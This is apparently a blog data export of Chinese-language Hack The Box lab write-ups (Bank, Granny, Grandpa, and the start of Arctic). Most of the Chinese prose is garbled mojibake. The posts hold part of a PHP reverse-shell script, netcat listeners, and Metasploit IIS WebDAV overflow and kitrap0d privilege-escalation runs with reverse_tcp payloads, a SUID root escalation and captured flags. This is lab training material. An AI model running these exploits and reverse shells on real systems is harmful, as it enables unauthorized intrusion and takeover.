If we can read from the process&#39;s STDERR // send data down tcp connection if (in_array($pipes[2], $read_a)) { if ($debug) printit(&quot;STDERR READ&quot;); $input = fread($pipes[2], $chunk_size); if ($debug) printit(&quot;STDERR: $input&quot;); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); // Like print, but does nothing if we&#39;ve daemonised ourself // (I can&#39;t figure out how to redirect STDOUT like a proper daemon) function printit ($string) { if (!$daemon) { print &quot;$string\\n&quot;; } } ?&gt; å°†æˆ‘ä»¬çš„ phpshell çš„åç¼€æ›´æ”¹ä¸º .htb ç„¶åå»ä¸Šä¼  ç„¶åä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£ nc -nvlp 4444 ä¼ ä¸Šå»ä»¥åï¼Œç‚¹ä¸€ä¸‹é™„ä»¶ â”Œâ”€â”€(rootğŸ’€kali)-[~/â€¦/HTB/Easy/Bank/Spider] â””â”€# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.16.4] from (UNKNOWN) [10.10.10.29] 37458 Linux bank 4.4.0-79-generic #100~14.04.1-Ubuntu SMP Fri May 19 18:37:52 UTC 2017 i686 athlon i686 GNU/Linux 05:08:13 up 20:18, 0 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) bash: cannot set terminal process group (1072): Inappropriate ioctl for device bash: no job control in this shell www-data@bank:/$ whoami&amp;&amp;id whoami&amp;&amp;id www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) æˆåŠŸæ‹¿åˆ°ä¸€ä¸ª shell python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;; Ctrl+Z è¿”å› stty raw -echo; fg export TERM=xterm stty rows 51 cols 237 ä¿®å¤ä¸€ä¸‹ shell æƒé™æå‡find / -user root -perm -4000 -print 2&gt;/dev/null æœç´¢ä¸€ä¸‹æˆ‘ä»¬å¯ä»¥ç”¨æ¥æå‡æƒé™çš„ SUID æ–‡ä»¶ www-data@bank:/$ find / -user root -perm -4000 -print 2&gt;/dev/null /var/htb/bin/emergency /usr/lib/eject/dmcrypt-get-device /usr/lib/openssh/ssh-keysign /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/policykit-1/polkit-agent-helper-1 /usr/bin/chsh /usr/bin/passwd /usr/bin/chfn /usr/bin/pkexec /usr/bin/newgrp /usr/bin/traceroute6.iputils /usr/bin/gpasswd /usr/bin/sudo /usr/bin/mtr /usr/sbin/pppd /bin/ping /bin/ping6 /bin/su /bin/fusermount /bin/mount /bin/umount ç¬¬ä¸€ä¸ªæ–‡ä»¶ä¸€çœ‹å°±ä¸ç®€å•ï¼Œå»è¿è¡Œä¸€ä¸‹ www-data@bank:/$ /var/htb/bin/emergency # ls bin boot dev etc home initrd.img initrd.img.old lib lost+found media mnt opt proc root run sbin srv sys tmp usr var vmlinuz vmlinuz.old # whoami root ç›´æ¥å°± root äº†ï¼Ÿæˆ‘ä¸æ˜¯å¾ˆç†è§£åŸç† # cat /home/chris/user.txt 20575ef51ddd60d74b616251bc305319 æ‹¿åˆ°äº† user æƒé™çš„ flag æ–‡ä»¶ # cat /root/root.txt 9e6410fc2696f73f668c5dde1f5d0d99 æ‹¿åˆ°äº† root æƒé™çš„ flag æ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Granny - Hackthebox","slug":"Hackthebox - Granny","date":"2022-03-29T11:38:36.000Z","updated":"2023-05-20T01:51:52.000Z","comments":true,"path":"2022/03/29/Hackthebox - Granny/","link":"","permalink":"http://www.lucifiel.com/2022/03/29/Hackthebox%20-%20Granny/","excerpt":"","text":"Hackthebox - Grannyé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†Nmapâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Granny] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.15 Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-28 00:33 EDT Nmap scan report for 10.10.10.15 Host is up (0.47s latency). Not shown: 65534 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 6.0 | http-methods: |_ Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT |_http-server-header: Microsoft-IIS/6.0 |_http-title: Under Construction | http-webdav-scan: | Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH | Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK | Server Type: Microsoft-IIS/6.0 | WebDAV type: Unknown |_ Server Date: Mon, 28 Mar 2022 04:34:35 GMT Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2003|2008|XP|2000 (92%) OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_2000::sp4 Aggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows Server 2008 Enterprise SP2 (92%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows XP SP3 (90%), Microsoft Windows 2000 SP4 or Windows XP Professional SP1 (90%), Microsoft Windows XP (87%), Microsoft Windows 2000 SP4 (87%), Microsoft Windows Server 2003 SP1 - SP2 (86%), Microsoft Windows XP SP2 or Windows Server 2003 (86%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 598.17 ms 10.10.16.1 2 598.29 ms 10.10.10.15 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 63.49 seconds Http è¿™å°å¾ˆçœ¼ç†Ÿå•Šï¼Œå’Œ Grandpa ä¼¼ä¹æ¶æ„ä¸€æ ·ï¼Œå»å°è¯•ä¸€ä¸‹ç›´æ¥æ‰“è¯•è¯• Metasploitmsf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; show options Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl): Name Current Setting Required Description ---- --------------- -------- ----------- MAXPATHLENGTH 60 yes End of physical path brute force MINPATHLENGTH 3 yes Start of physical path brute force Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.15 yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes Path of IIS 6 web application VHOST no HTTP server virtual host Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: &#39;&#39;, seh, thread, process, none) LHOST 10.10.16.4 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Microsoft Windows Server 2003 R2 SP2 x86 è®¾ç½®å¥½ç›¸å…³çš„é…ç½®ï¼Œå¯åŠ¨ msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; exploit [*] Started reverse TCP handler on 10.10.16.4:4444 [*] Trying path length 3 to 60 ... [*] Sending stage (175174 bytes) to 10.10.10.15 [*] Meterpreter session 1 opened (10.10.16.4:4444 -&gt; 10.10.10.15:1030) at 2022-03-28 00:39:57 -0400 meterpreter &gt; getuid [-] stdapi_sys_config_getuid: Operation failed: Access is denied. ä¼¼ä¹è¿çªç ´ç‚¹éƒ½ä¸€æ ·ï¼Œæœ‰ç‚¹ç¦»è°± meterpreter &gt; ps Process List ============ PID PPID Name Arch Session User Path --- ---- ---- ---- ------- ---- ---- 0 0 [System Process] 4 0 System 272 4 smss.exe 320 272 csrss.exe 344 272 winlogon.exe 392 344 services.exe 404 344 lsass.exe 560 1064 cidaemon.exe 584 392 svchost.exe 672 392 svchost.exe 732 392 svchost.exe 772 392 svchost.exe 788 392 svchost.exe 888 1064 cidaemon.exe 924 392 spoolsv.exe 952 392 msdtc.exe 960 1064 cidaemon.exe 1064 392 cisvc.exe 1112 392 svchost.exe 1168 392 inetinfo.exe 1204 392 svchost.exe 1312 392 VGAuthService.exe 1380 392 vmtoolsd.exe 1488 392 svchost.exe 1588 392 svchost.exe 1760 392 dllhost.exe 1856 392 alg.exe 1876 584 wmiprvse.exe x86 0 NT AUTHORITY\\NETWORK SERVICE C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe 2252 1488 w3wp.exe x86 0 NT AUTHORITY\\NETWORK SERVICE c:\\windows\\system32\\inetsrv\\w3wp.exe 2392 584 davcdata.exe x86 0 NT AUTHORITY\\NETWORK SERVICE C:\\WINDOWS\\system32\\inetsrv\\davcdata.exe 2552 584 wmiprvse.exe 3792 2252 rundll32.exe x86 0 C:\\WINDOWS\\system32\\rundll32.exe meterpreter &gt; migrate 1876 [*] Migrating from 3792 to 1876... [*] Migration completed successfully. meterpreter &gt; getuid Server username: NT AUTHORITY\\NETWORK SERVICE è·Ÿ Grandpa ä¸€æ ·çš„æ¼æ´æƒ…å†µï¼Œåšä¸€ä¸ªè¿›ç¨‹è¿ç§»å°±å¯ä»¥äº† ç°åœ¨å»ææƒå§ æƒé™æå‡msf6 exploit(windows/local/ms10_015_kitrap0d) &gt; show options Module options (exploit/windows/local/ms10_015_kitrap0d): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION 1 yes The session to run this module on. Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: &#39;&#39;, seh, thread, process, none) LHOST 10.10.16.4 yes The listen address (an interface may be specified) LPORT 5555 yes The listen port Exploit target: Id Name -- ---- 0 Windows 2K SP4 - Windows 7 (x86) è®¾ç½®å¥½ sessionï¼Œå»æ‰§è¡Œ msf6 exploit(windows/local/ms10_015_kitrap0d) &gt; exploit [*] Started reverse TCP handler on 10.10.16.4:5555 [*] Launching notepad to host the exploit... [+] Process 2088 launched. [*] Reflectively injecting the exploit DLL into 2088... [*] Injecting exploit into 2088 ... [*] Exploit injected. Injecting payload into 2088... [*] Payload injected. Executing exploit... [+] Exploit finished, wait for (hopefully privileged) payload execution to complete. [*] Sending stage (175174 bytes) to 10.10.10.15 [*] Meterpreter session 2 opened (10.10.16.4:5555 -&gt; 10.10.10.15:1031) at 2022-03-28 00:45:56 -0400 meterpreter &gt; getuid Server username: NT AUTHORITY\\SYSTEM æˆåŠŸææƒåˆ° root æƒé™ meterpreter &gt; search -f user.txt Found 1 result... c:\\Documents and Settings\\Lakis\\Desktop\\user.txt (32 bytes) meterpreter &gt; search -f root.txt Found 1 result... c:\\Documents and Settings\\Administrator\\Desktop\\root.txt (32 bytes) meterpreter &gt; cat &#39;c:\\Documents and Settings\\Lakis\\Desktop\\user.txt&#39; 700c5dc163014e22b3e408f8703f67d1 meterpreter &gt; cat &#39;c:\\Documents and Settings\\Administrator\\Desktop\\root.txt&#39; aa4beed1c0584445ab463a6747bd06e9 meterpreter &gt; æˆåŠŸæ‹¿åˆ° user å’Œ root æƒé™çš„ flag æ–‡ä»¶ è¿™å°çš„æƒ…å†µå’Œ Grandpa ä¸€æ¨¡ä¸€æ ·ï¼Œæ²¡ä»€ä¹ˆå¥½è¯´çš„","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Grandpa - Hackthebox","slug":"Hackthebox - Grandpa","date":"2022-03-28T11:38:36.000Z","updated":"2023-05-20T01:51:27.000Z","comments":true,"path":"2022/03/28/Hackthebox - Grandpa/","link":"","permalink":"http://www.lucifiel.com/2022/03/28/Hackthebox%20-%20Grandpa/","excerpt":"","text":"Hackthebox - Grandpaé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†Nmapâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Grandpa] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.14 Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-25 02:52 EDT Nmap scan report for 10.10.10.14 Host is up (0.53s latency). Not shown: 65534 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 6.0 | http-methods: |_ Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH |_http-server-header: Microsoft-IIS/6.0 |_http-title: Under Construction | http-webdav-scan: | Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH | Server Type: Microsoft-IIS/6.0 | Server Date: Fri, 25 Mar 2022 06:53:29 GMT | WebDAV type: Unknown |_ Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2003|2008|XP|2000 (92%) OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_2000::sp4 Aggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows Server 2008 Enterprise SP2 (92%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows XP SP3 (90%), Microsoft Windows 2000 SP4 or Windows XP Professional SP1 (90%), Microsoft Windows XP (87%), Microsoft Windows 2000 SP4 (87%), Microsoft Windows Server 2003 SP1 - SP2 (86%), Microsoft Windows XP SP2 or Windows Server 2003 (86%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 524.27 ms 10.10.16.1 2 524.42 ms 10.10.10.14 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 71.52 seconds Http è¿™é‡Œæç¤ºæ²¡æœ‰é»˜è®¤é¡µé¢ï¼Œå»çœ‹çœ‹æ˜¯ä¸æ˜¯ IIS æœ¬èº«çš„æ¼æ´å§ Searchsploitâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# searchsploit IIS 6.0 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Microsoft IIS 4.0/5.0/6.0 - Internal IP Address/Internal Network Name Disclosure | windows/remote/21057.txt Microsoft IIS 5.0/6.0 FTP Server (Windows 2000) - Remote Stack Overflow | windows/remote/9541.pl Microsoft IIS 5.0/6.0 FTP Server - Stack Exhaustion Denial of Service | windows/dos/9587.txt Microsoft IIS 6.0 - &#39;/AUX / &#39;.aspx&#39; Remote Denial of Service | windows/dos/3965.pl Microsoft IIS 6.0 - ASP Stack Overflow Stack Exhaustion (Denial of Service) (MS10-065) | windows/dos/15167.txt Microsoft IIS 6.0 - WebDAV &#39;ScStoragePathFromUrl&#39; Remote Buffer Overflow | windows/remote/41738.py Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass | windows/remote/8765.php Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1) | windows/remote/8704.txt Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2) | windows/remote/8806.pl Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch) | windows/remote/8754.patch Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities | windows/remote/19033.txt ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results æˆ‘ä»¬çœ‹çœ‹ Microsoft IIS 6.0 - WebDAV â€˜ScStoragePathFromUrlâ€™ Remote Buffer Overflow è¿œç¨‹ç¼“å†²åŒºæº¢å‡ºï¼Œæ„Ÿè§‰æœ‰æˆ æ¼æ´åˆ©ç”¨å…ˆå»çœ‹çœ‹ msf æœ‰æ²¡æœ‰ç›¸å…³çš„æ¼æ´åˆ©ç”¨æ¨¡å— msf6 &gt; search IIS 6.0 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/firewall/blackice_pam_icq 2004-03-18 great No ISS PAM.dll ICQ Parser Buffer Overflow 1 auxiliary/dos/windows/http/ms10_065_ii6_asp_dos 2010-09-14 normal No Microsoft IIS 6.0 ASP Stack Exhaustion Denial of Service 2 exploit/windows/iis/iis_webdav_scstoragepathfromurl 2017-03-26 manual Yes Microsoft IIS WebDav ScStoragePathFromUrl Overflow Interact with a module by name or index. For example info 2, use 2 or use exploit/windows/iis/iis_webdav_scstoragepathfromurl è¿™è¾¹ç¡®å®æœ‰ä¸€ä¸ªï¼Œå»åŠ è½½ä¸€ä¸‹è¯•è¯• msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; show options Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl): Name Current Setting Required Description ---- --------------- -------- ----------- MAXPATHLENGTH 60 yes End of physical path brute force MINPATHLENGTH 3 yes Start of physical path brute force Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.14 yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes Path of IIS 6 web application VHOST no HTTP server virtual host Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: &#39;&#39;, seh, thread, process, none) LHOST 10.10.16.4 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Microsoft Windows Server 2003 R2 SP2 x86 è®¾ç½®å¥½ç›¸å…³çš„é…ç½®ï¼Œç„¶åæ‰§è¡Œ msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; exploit [*] Started reverse TCP handler on 10.10.16.4:4444 [*] Trying path length 3 to 60 ... [*] Sending stage (175174 bytes) to 10.10.10.14 [*] Meterpreter session 2 opened (10.10.16.4:4444 -&gt; 10.10.10.14:1031) at 2022-03-25 03:31:02 -0400 meterpreter &gt; shell [-] Failed to spawn shell with thread impersonation. Retrying without it. Process 2056 created. Channel 2 created. Microsoft Windows [Version 5.2.3790] (C) Copyright 1985-2003 Microsoft Corp. c:\\windows\\system32\\inetsrv&gt;whoami whoami nt authority\\network service æˆåŠŸæ‹¿åˆ°ä¸€ä¸ª shell ä¸è¿‡æƒé™å¾ˆä½ ä½¿ç”¨ background è¿”å› æƒé™æå‡ä½¿ç”¨ post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester è¿›è¡Œææƒè„šæœ¬æŸ¥è¯¢ msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; use post/multi/recon/local_exploit_suggester msf6 post(multi/recon/local_exploit_suggester) &gt; show options Module options (post/multi/recon/local_exploit_suggester): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION yes The session to run this module on SHOWDESCRIPTION false yes Displays a detailed description for the available exploits msf6 post(multi/recon/local_exploit_suggester) &gt; set session 2 session =&gt; 2 è®¾ç½®å¥½ä»¥åï¼Œexploit æ‰§è¡Œ msf6 post(multi/recon/local_exploit_suggester) &gt; exploit [*] 10.10.10.14 - Collecting local exploits for x86/windows... [*] 10.10.10.14 - 38 exploit checks are being tried... [+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated. [+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. [+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable. [+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. [+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated. [+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable. [*] Post module execution completed ä»¥ä¸Šéƒ½æ˜¯å½“å‰æœºå™¨ä¸‹å¯èƒ½å¯ç”¨çš„ææƒæ¨¡å— exploit/windows/local/ms10_015_kitrap0d æŒ¨ä¸ªå°è¯•åï¼Œéƒ½æ˜¯æç¤ºæ²¡æœ‰æƒé™ â€œExploit failed: Rex::Post::Meterpreter::RequestError stdapi_sys_config_getsid: Operation failed: Access is denied.â€ meterpreter &gt; getuid [-] stdapi_sys_config_getuid: Operation failed: Access is denied. ç›´æ¥ä½¿ç”¨ getuid å‘½ä»¤ä¹Ÿæ˜¯ä¸è¡Œçš„ meterpreter &gt; ps Process List ============ PID PPID Name Arch Session User Path --- ---- ---- ---- ------- ---- ---- 0 0 [System Process] 4 0 System 272 4 smss.exe 320 272 csrss.exe 344 272 winlogon.exe 392 344 services.exe 404 344 lsass.exe 532 584 davcdata.exe x86 0 NT AUTHORITY\\NETWORK SERVICE C:\\WINDOWS\\system32\\inetsrv\\davcdata.exe 584 392 svchost.exe 668 392 svchost.exe 732 392 svchost.exe 772 392 svchost.exe 788 392 svchost.exe 924 392 spoolsv.exe 952 392 msdtc.exe 1072 392 cisvc.exe 1112 392 svchost.exe 1168 392 inetinfo.exe 1204 392 svchost.exe 1308 392 VGAuthService.exe 1380 392 vmtoolsd.exe 1484 392 svchost.exe 1588 392 svchost.exe 1768 392 dllhost.exe 1908 392 alg.exe 1936 584 wmiprvse.exe x86 0 NT AUTHORITY\\NETWORK SERVICE C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe 2404 584 wmiprvse.exe 2604 344 logon.scr 2656 1484 w3wp.exe x86 0 NT AUTHORITY\\NETWORK SERVICE c:\\windows\\system32\\inetsrv\\w3wp.exe 3408 2656 rundll32.exe x86 0 C:\\WINDOWS\\system32\\rundll32.exe 3892 1072 cidaemon.exe 3936 1072 cidaemon.exe 3972 1072 cidaemon.exe meterpreter &gt; migrate 1936 [*] Migrating from 3408 to 1936... [*] Migration completed successfully. å°è¯•ä¸€ä¸‹è¿›ç¨‹è¿ç§» meterpreter &gt; getuid Server username: NT AUTHORITY\\NETWORK SERVICE è¿›ç¨‹è¿ç§»åå¯ä»¥æ‰§è¡Œ getuid å‘½ä»¤ å†å°è¯•ä¸€ä¸‹ææƒæ¨¡å— exploit&#x2F;windows&#x2F;local&#x2F;ms10_015_kitrap0d msf6 exploit(windows/local/ms10_015_kitrap0d) &gt; show options Module options (exploit/windows/local/ms10_015_kitrap0d): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION 1 yes The session to run this module on. Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: &#39;&#39;, seh, thread, process, none) LHOST 10.10.16.4 yes The listen address (an interface may be specified) LPORT 5555 yes The listen port Exploit target: Id Name -- ---- 0 Windows 2K SP4 - Windows 7 (x86) ç„¶åæ‰§è¡Œ msf6 exploit(windows/local/ms10_015_kitrap0d) &gt; exploit [*] Started reverse TCP handler on 10.10.16.4:5555 [*] Launching notepad to host the exploit... [+] Process 408 launched. [*] Reflectively injecting the exploit DLL into 408... [*] Injecting exploit into 408 ... [*] Exploit injected. Injecting payload into 408... [*] Payload injected. Executing exploit... [+] Exploit finished, wait for (hopefully privileged) payload execution to complete. [*] Sending stage (175174 bytes) to 10.10.10.14 [*] Meterpreter session 2 opened (10.10.16.4:5555 -&gt; 10.10.10.14:1031) at 2022-03-27 21:33:07 -0400 meterpreter &gt; getuid Server username: NT AUTHORITY\\SYSTEM æˆåŠŸææƒåˆ° system æƒé™ meterpreter &gt; search -f user.txt Found 1 result... c:\\Documents and Settings\\Harry\\Desktop\\user.txt (32 bytes) meterpreter &gt; search -f root.txt Found 1 result... c:\\Documents and Settings\\Administrator\\Desktop\\root.txt (32 bytes) meterpreter &gt; cat &#39;c:\\Documents and Settings\\Harry\\Desktop\\user.txt&#39; bdff5ec67c3cff017f2bedc146a5d869 meterpreter &gt; cat &#39;c:\\Documents and Settings\\Administrator\\Desktop\\root.txt&#39; 9359e905a2c35f861f6a57cecf28bb7b meterpreter &gt; æˆåŠŸæ‹¿åˆ° user å’Œ root æƒé™çš„ flag æ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Arctic - Hackthebox","slug":"Hackthebox - Arctic","date":"2022-03-25T11:38:36.000Z","updated":"2023-05-19T11:46:48.000Z","comments":true,"path":"2022/03/25/Hackthebox - Arctic/","link":"","permalink":"http://www.lucifiel.com/2022/03/25/Hackthebox%20-%20Arctic/","excerpt":"","text":"Hackthebox - Arcticé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†Nmapâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Arctic] â””â”€# nmap -sC -sV -oA nmap 10.10.10.11 Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-24 02:23 EDT Nmap scan report for 10.10.10.11 Host is up (0.35s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 8500/tcp open fmtp? 49154/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 252.28 seconds HTTPè¿™é‡Œçš„ 8500 æ˜¯ä¸€ä¸ª HTTP æœåŠ¡ï¼Œæ‰“å¼€åéœ€è¦ç­‰å¾…çº¦ 10-20 ç§’çš„æ—¶é—´æ¥åŠ è½½ã€‚è¿™å°é¶æœºçš„ç¿»è¯‘å«åšåŒ—æï¼Œæˆ‘æƒ³åŸå› å°±æ˜¯å› ä¸ºå¤ªæ…¢äº†å§ã€‚ åœ¨ CFIDE ç›®å½•ä¸‹æœ‰ä¸€ä¸ª administrator ç›®å½•ï¼Œæˆ‘ä»¬è¿›å»çœ‹çœ‹ ç„¶åå°±ä¼šè¿›å…¥ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œèµ«ç„¶å†™ç€ ColdFusion 8ï¼Œå» search ä¸€ä¸‹çœ‹çœ‹æœ‰æ²¡æœ‰ç›¸å…³çš„æ¼æ´ æ¼æ´åˆ©ç”¨SearchSploitâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Arctic] â””â”€# searchsploit ColdFusion 8 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Adobe ColdFusion - &#39;probe.cfm&#39; Cross-Site Scripting | cfm/webapps/36067.txt Adobe ColdFusion - Directory Traversal | multiple/remote/14641.py Adobe ColdFusion - Directory Traversal (Metasploit) | multiple/remote/16985.rb Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Execution | windows/remote/43993.py Adobe ColdFusion 2018 - Arbitrary File Upload | multiple/webapps/45979.txt Adobe ColdFusion 9 - Administrative Authentication Bypass | windows/webapps/27755.txt Adobe ColdFusion &lt; 11 Update 10 - XML External Entity Injection | multiple/webapps/40346.py Adobe ColdFusion Server 8.0.1 - &#39;/administrator/enter.cfm&#39; Query String Cross-Site Scripting | cfm/webapps/33170.txt Adobe ColdFusion Server 8.0.1 - &#39;/wizards/common/_authenticatewizarduser.cfm&#39; Query String Cross-Site Scripting | cfm/webapps/33167.txt Adobe ColdFusion Server 8.0.1 - &#39;/wizards/common/_logintowizard.cfm&#39; Query String Cross-Site Scripting | cfm/webapps/33169.txt Adobe ColdFusion Server 8.0.1 - &#39;administrator/logviewer/searchlog.cfm?startRow&#39; Cross-Site Scripting | cfm/webapps/33168.txt Allaire ColdFusion Server 4.0 - Remote File Display / Deletion / Upload / Execution | multiple/remote/19093.txt Allaire ColdFusion Server 4.0.1 - &#39;CFCRYPT.EXE&#39; Decrypt Pages | windows/local/19220.c ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit) | cfm/webapps/16788.rb ColdFusion 9-10 - Credential Disclosure | multiple/webapps/25305.py ColdFusion MX - Missing Template Cross-Site Scripting | cfm/remote/21548.txt ColdFusion Scripts Red_Reservations - Database Disclosure | asp/webapps/7440.txt Macromedia ColdFusion MX 6.0 - Remote Development Service File Disclosure | multiple/remote/22867.pl ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results ColdFusion 8.0.1 - Arbitrary File Upload &#x2F; Execution (Metasploit) è¿™æ¡æ˜¾ç¤ºæœ‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œå¹¶ä¸”æœ‰ MSF è„šæœ¬ï¼Œå»è¿è¡Œè¯•è¯• Msfconsolemsf6 &gt; search ColdFusion Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/multi/http/coldfusion_ckeditor_file_upload 